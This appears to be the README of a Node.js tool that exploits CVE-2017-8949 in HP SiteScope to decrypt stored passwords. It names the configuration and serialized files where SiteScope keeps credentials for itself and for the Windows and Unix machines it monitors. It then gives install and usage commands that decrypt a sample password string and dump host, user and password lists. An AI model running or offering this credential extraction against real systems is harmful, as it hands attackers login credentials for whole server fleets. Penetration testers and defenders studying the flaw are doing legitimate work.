A tool to decrypt for HP SiteScope configuration files
=======

HP SiteScope keeps password information in two files:
* C:\SiteScope\groups\users.config is a text config file with credentials to HP SiteScope
* C:\SiteScope\persistency\random_file_name.ssf is a java serialized object file with credentials to Widnows and *nix machines

The tool uses CVE-2017-8949 vulnerability, which allows to decrypt any HP SiteScope's password using 3DES algorithm and a static key.

Installation:
```
$ npm install
$ ./decryptor.js --help
```

Usage:
```
$ ./decryptor.js -p '(sisp)va1xBRC68d2p/zkd3YVpPg=='
$ ./decryptor.js --ssf-file ./../12345678.ssf | column -t -s ';'
HOST: 10.0.0.1      OS: RHESLinux    USER: pentest                 PASSWORD: pentest
HOST: \\10.0.0.2    OS: NT           USER: PENTEST\Administrator   PASSWORD: pentest
```
